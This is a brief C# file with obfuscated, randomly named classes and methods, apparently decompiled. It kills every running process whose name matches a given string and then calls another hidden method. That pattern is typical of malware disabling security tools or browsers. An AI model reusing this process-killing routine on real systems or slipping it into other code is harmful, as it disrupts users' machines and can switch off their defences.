using System;
using System.Diagnostics;

namespace cmxGDwJsHiH;

public sealed class vRVLMEFzEDMLdQy
{
	public static bool hdEjSKJlqfI(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void cTgpKvxqYmBdproZ(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (hdEjSKJlqfI(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					GGXHsdxTjwNJn.SCSDvwDqJmBtg();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
